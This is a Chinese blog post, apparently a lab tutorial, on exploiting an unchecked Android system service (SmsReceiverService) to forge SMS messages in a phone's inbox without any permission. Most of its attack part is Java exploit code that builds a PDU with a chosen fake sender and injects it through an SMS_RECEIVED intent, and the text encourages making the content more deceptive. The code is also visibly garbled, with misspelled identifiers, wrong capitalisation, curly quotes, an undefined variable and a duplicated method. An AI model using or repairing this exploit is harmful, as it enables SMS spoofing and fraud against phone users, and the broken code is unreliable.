---
title: Android安全之短信欺诈漏洞
date: 2021-12-27 19:46:16
tags: 
- Android
- 短信
- 欺诈
---

目的：
* 通过JAVA编程理解Android手机安全漏洞的基本原理
* 用JAVA编写伪造短信代码，向系统收件箱发送伪造短信

原理：
* 漏洞原理介绍
* 该系统漏洞能够使攻击者无需申请任何权限发送短信到用户收件箱。 出现该漏洞的原因是Android系统的com.android.mms.transaction。
* SmsReceiverService系统服务未判断启动服务的调用者，攻击者可以通过该应用发送伪装短信到用户收件箱。本漏洞实质上是一种能力的泄漏。
* 漏洞发送的短信并不经过GSM网络,所以即使手机没有插sim卡,也照样可以收到短信,这让大部分的短信防火墙完全失效。

过程：

打开eclipse，点击file-import，选择android目录下的existing android code into workspace![image-20211229100046569](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100046569.png)

选择simpleedu28项目![image-20211229100118574](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100118574.png)

导入后的项目![image-20211229100200697](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100200697.png)

在工程目录res/layout的界面代码，这里可以通过控制代码，编辑相应的函数生成欺诈短信，点击activity_main.xml，可以看到界面布局的文件![image-20211229100257165](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100257165.png)

在mainactivity中添加运行欺诈短信的代码，点开`msgdemo2\src\com.example.msgdemol\mainactivity.java`![image-20211229100406295](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100406295.png)

在mainactivity的init()函数添加如下代码，为button设置监听事件

```java
//为发送按钮设置监听
sendBt.setOnClickListener(new OnClickListener(){
       @Override
       public void onClick(View v){
                       /*
                 *获取输入的伪造号码和内
                 *判断输入是否合法
*/
String num=msgNumTv.getText().toString();
String con=msgConTv.getText().toString();
If(num.length()<1||con.length()<1)
{ Toast.makeText(MainActivity.this,”电话号码或者内容没有输入”,Toast.LENGTH_SHORT).show();
return;}
//判断通过伪造短信
//make Msg(MainActivity.this,num,con);
createFakeMsg(MainActivity.this,num,con);}
});
```

在MainActivity的init()函数,跳转到init函数位置添加上一步的代码

![image-20211229101856123](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229101856123.png)createFakeMsg的具体代码

```java
/**
 *伪造短信
* @param context
@param num
* @param con
 */
          Private static void createFakeMsg(Context context,String num,String con){
                byte[] pdu=null;
                byte[] scBytes=PhoneNumberUtils.networkPortionToCalledPartyBCD(num);
                int lsmcs=scBytes.length;
                byte[] dateBytes=new byte[7];
                Calendar calendar=new GregorianCalendar();
                dateBytes[0]=reverseByte((byte)(calendar.get(Caledar.YEAR)));
                dateBytes[1]=reverseByte((byte)(calendar.get(Caledar.MONTH)+1));
                dateBytes[2]=reverseByte((byte)(calendar.get(Caledar.DAY_OF_MONTH)));
                dateBytes[3]=reverseByte((byte)(calendar.get(Caledar.HOUR_OF_DAY)));
                dateBytes[4]=reverseByte((byte)(calendar.get(Caledar.MINUTE)));
                dateBytes[5]=reverseByte((byte)(calendar.get(Caledar.SECOND)));
                dateBytes[6]=reverseByte((byte)(（calendar.get(Caledar.ZONE_OFFSET)+calendar.get(Calendar.DST_OFFSET))/(60*1000*15)）);
                try{
          // Log.d(LOG,”test one”);
                 ByteArrayOutputStream bo=new ByteArrayOutputStream();
                 bo.write(lsmcs);
                 bo.write(scBytes);
                 bo.write(0x04);
                 bo.write((byte)num.length());
                 bo.write(senderBytes);
                 bo.write(0x00);
                 bo.write(0x00);//encoding:0 for default 7bit
                 bo.write(dateBytes);
                 try{
          String sReflectedClassName=”com.android.internal.telephony.GsmAlphabet”;
          Class cRefectedNFCExtras=Class.forName(sReflectedClassName);
          Method stringToGsm7BitPacketd=cReflectedNFCExtras.getMethod(“stringToGsm7BitPacketd”,new Clas[]{String.class});
          stringToGsm7BitPacked.setAccessible(true);
          byte[] conbytes=(byte[]) stringToGsm7BitPacked.invoke(null,con);
          bo.write(conbytes);
          }catch(Exception e){e.printStackTrace();}
          pdu=bo.toByteArray();}
          catch(IOException e){e.printStackTrace();}
          Intent intent=newIntent();
          Intent.setClassName（“com.android.mms.transaction.SmsReceiverService”）;
          Intent.setAction(“android.provider.Telephony.SMS_RECEIVED”);
          Intent.putExtra(“pdus”,new Object[]{pdu});
          //intent.putExtra(“format”,”3gpp”);
          Context.startService(intent);}
          Private static byte reverseByte(byte b){
          private static byte reverseByte(byte b){
          return (byte)((b&0xf0)>>4|(b&0x0f)<<4);}
```

在已经设计好的欺诈短信发送界面，有两部分内容：伪造号码与伪造内容。这里的伪造号码，这是发件人的号码，因为是发给自己，所以没有收件人号码，。至于内容可以随意填写内容，使短信更具欺诈性。

AVD中打开虚拟机Simpleedu28虚拟安卓![image-20211229102354469](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102354469.png)

右键MSGDEMO2，选择run as-android application按钮![image-20211229102712162](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102712162.png)

虚拟端返回运行后结果![image-20211229102740838](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102740838.png)

点击发送，手机接收欺诈短信

![image-20211229102848974](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102848974.png)

